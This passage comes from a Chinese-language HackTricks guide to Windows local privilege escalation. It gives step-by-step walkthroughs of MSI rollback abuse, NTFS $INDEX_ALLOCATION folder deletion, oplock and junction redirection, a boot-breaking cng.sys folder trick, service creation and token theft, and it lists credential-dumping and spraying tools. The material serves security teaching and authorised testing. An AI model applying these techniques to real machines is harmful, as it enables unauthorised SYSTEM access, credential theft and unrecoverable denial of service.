- 你（攻击者）手动删除 `.rbf` 文件。
- 现在 **`C:\Config.Msi` 变为空**，可供劫持。

> 此时，**触发 SYSTEM-level 的任意文件夹删除漏洞**以删除 `C:\Config.Msi`。

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- 你重新创建 `C:\Config.Msi` 文件夹。
- 设置**弱的 DACLs**（例如 Everyone:F），并保持一个带有 `WRITE_DAC` 的 handle 打开。

- Step 7: Run Another Install
- 再次安装该 `.msi`，并设置：
- `TARGETDIR`：可写位置。
- `ERROROUT`：触发强制失败的变量。
- 这次安装将再次触发 **rollback**，它会读取 `.rbs` 和 `.rbf`。

- Step 8: Monitor for `.rbs`
- 使用 `ReadDirectoryChangesW` 监视 `C:\Config.Msi`，直到出现新的 `.rbs`。
- 捕获其文件名。

- Step 9: Sync Before Rollback
- 该 `.msi` 包含一个 **custom install action (`SyncBeforeRollback`)**，该动作：
- 在 `.rbs` 创建时发送一个事件信号。
- 然后在继续之前 **等待**。

- Step 10: Reapply Weak ACL
- 在收到 `.rbs created` 事件后：
- Windows Installer 会**重新应用强 ACLs** 到 `C:\Config.Msi`。
- 但由于你仍然持有带有 `WRITE_DAC` 的 handle，你可以**再次重新应用弱 ACLs**。

> ACLs 是**仅在打开句柄时强制执行**，因此你仍然可以写入该文件夹。

- Step 11: Drop Fake `.rbs` and `.rbf`
- 覆盖 `.rbs` 文件为一个 **伪造的 rollback 脚本**，指示 Windows：
- 将你的 `.rbf`（恶意 DLL）恢复到一个 **特权位置**（例如 `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）。
- 放下你伪造的 `.rbf`，其中包含 **恶意的 SYSTEM 级负载 DLL**。

- Step 12: Trigger the Rollback
- 发出同步事件以使安装程序继续。
- 一个 **type 19 custom action (`ErrorOut`)** 被配置为在已知点**故意使安装失败**。
- 这会导致**回滚开始**。

- Step 13: SYSTEM Installs Your DLL
- Windows Installer：
- 读取你恶意的 `.rbs`。
- 将你的 `.rbf` DLL 复制到目标位置。
- 现在你的 **恶意 DLL 位于由 SYSTEM 加载的路径**。

- Final Step: Execute SYSTEM Code
- 运行一个受信任的 **auto-elevated binary**（例如 `osk.exe`），它会加载你劫持的 DLL。
- **Boom**：你的代码以 **SYSTEM** 身份执行。


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

主要的 MSI rollback 技术（上面所述）假定你可以删除整个文件夹（例如 `C:\Config.Msi`）。但如果你的漏洞只允许**任意文件删除**怎么办？

你可以利用 **NTFS internals**：每个文件夹都有一个名为的隐藏替代数据流：
```
C:\SomeFolder::$INDEX_ALLOCATION
```
此流存储该文件夹的 **索引元数据**。

因此，如果你 **删除文件夹的 `::$INDEX_ALLOCATION` 流**，NTFS 会从文件系统中 **移除整个文件夹**。

你可以使用标准文件删除 API（例如）：
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> 即使你调用的是 *file* delete API，它 **会删除文件夹本身**。

### 从 Folder Contents Delete 到 SYSTEM EoP
如果你的 primitive 不允许你删除任意文件/文件夹，但它 **does allow deletion of the *contents* of an attacker-controlled folder**？

1. 步骤 1：设置诱饵文件夹和文件
- 创建: `C:\temp\folder1`
- 在其中: `C:\temp\folder1\file1.txt`

2. 步骤 2：将一个 **oplock** 放在 `file1.txt` 上
- 当有特权进程尝试删除 `file1.txt` 时，该 oplock **暂停执行**。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. 第3步：触发 SYSTEM 进程（例如，`SilentCleanup`）
- 该进程会扫描文件夹（例如，`%TEMP%`）并尝试删除其中的内容。
- 当它遇到 `file1.txt` 时，**oplock 触发** 并将控制权交给你的回调。

4. 第4步：在 oplock 回调中 – 重定向删除操作

- 选项 A：将 `file1.txt` 移到其他位置
- 这样会清空 `folder1`，而不会破坏 oplock。
- 不要直接删除 `file1.txt` —— 那会过早释放 oplock。

- 选项 B：将 `folder1` 转换为 **junction**：
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- 选项 C: 在 `\RPC Control` 中创建一个 **symlink**：
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> 这针对存储文件夹元数据的 NTFS 内部流 — 删除它会删除该文件夹。

5. 第5步：释放 oplock
- SYSTEM 进程继续并尝试删除 `file1.txt`。
- 但现在，由于 junction + symlink，它实际上正在删除：
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**结果**: `C:\Config.Msi` 被 SYSTEM 删除。

### 从 Arbitrary Folder Create 到 Permanent DoS

利用一个原语，让你 **create an arbitrary folder as SYSTEM/admin** — 即使 **you can’t write files** 或 **set weak permissions**。

创建一个 **folder**（不是 file），其名称为 **critical Windows driver**，例如：
```
C:\Windows\System32\cng.sys
```
- 此路径通常对应于 `cng.sys` 内核模式驱动程序。
- 如果你 **预先将其创建为一个文件夹**，Windows 在启动时无法加载实际的驱动程序。
- 然后，Windows 在启动时尝试加载 `cng.sys`。
- 它看到该文件夹，**无法解析实际的驱动程序**，并**导致崩溃或停止启动**。
- 没有**回退**，并且**无法恢复**，除非进行外部干预（例如，启动修复或磁盘访问）。


## **从 High Integrity 到 System**

### **新服务**

如果你已经在 High Integrity 进程上运行，**通往 SYSTEM 的路径**可以通过**创建并执行一个新服务**来轻松实现：
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> 在创建 service binary 时，确保它是一个有效的 service，或者二进制执行必要的操作，因为如果它不是一个有效的 service，会在 20s 内被终止。

### AlwaysInstallElevated

从 High Integrity 进程可以尝试 **启用 AlwaysInstallElevated 注册表项** 并使用一个 _**.msi**_ 封装 **安装** 反向 shell。\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**你可以** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

如果你拥有这些 token 权限（通常你会在已是 High Integrity 的进程里发现它们），你将能够使用 SeDebug 权限 **打开几乎任何进程**（非 protected processes），**复制该进程的 token**，并使用该 token **创建任意进程**。\
使用此技术通常会 **选择任何以 SYSTEM 运行且具有所有 token 权限的进程**（_是的，你可能会找到没有所有 token 权限的 SYSTEM 进程_）。\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

该技术被 meterpreter 用于在 `getsystem` 中提权。该技术由 **创建一个 pipe，然后创建/滥用一个 service 向该 pipe 写入** 组成。随后，使用 **`SeImpersonate`** 权限创建该 pipe 的 **server** 将能够 **模拟 pipe 客户端（service）的 token**，从而获取 SYSTEM 权限。\
如果你想 [**learn more about name pipes you should read this**](#named-pipe-client-impersonation)。\
如果你想读一个 [**如何从 high integrity 使用 name pipes 提权到 System 的示例**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

如果你能够 **劫持一个被 SYSTEM 进程加载的 dll**，你就能够以那些权限执行任意代码。因此 Dll Hijacking 对于此类提权也很有用，而且从 high integrity 进程发起更 **容易实现**，因为它通常对用于加载 dll 的文件夹具有 **写权限**。\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 检查 misconfigurations 和 敏感文件 （**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 检查一些可能的 misconfigurations 并收集信息（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 检查 misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- 提取 PuTTY, WinSCP, SuperPuTTY, FileZilla 和 RDP 的保存会话信息。在本地使用 -Thorough。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- 从 Credential Manager 提取凭证。Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 将收集到的密码在域内进行 spray**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh 是一个 PowerShell ADIDNS/LLMNR/mDNS/NBNS 欺骗与中间人工具。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基础的 privesc Windows 枚举**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- 搜索已知的 privesc 漏洞（DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- 本地检查 **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 搜索已知的 privesc 漏洞（需要用 VisualStudio 编译）（[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 枚举主机以查找 misconfigurations（更像信息收集工具而非单纯的 privesc）（需要编译）**(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 从大量软件中提取凭证（github 上有预编译 exe）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp 的 C# 移植**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- 检查 misconfiguration（在 github 有预编译可执行文件）。不推荐。它在 Win10 上表现不佳。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 检查可能的 misconfigurations（基于 python 的 exe）。不推荐。它在 Win10 上表现不佳。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- 基于此帖子创建的工具（它不需要 accesschk 即能正常工作，但可以使用它）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- 读取 **systeminfo** 的输出并推荐可用的 exploit（本地 python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- 读取 **systeminfo** 的输出并推荐可用的 exploit（本地 python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

你需要使用正确版本的 .NET 编译该项目（[see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。要查看受害主机上已安装的 .NET 版本，你可以执行：
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考资料

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
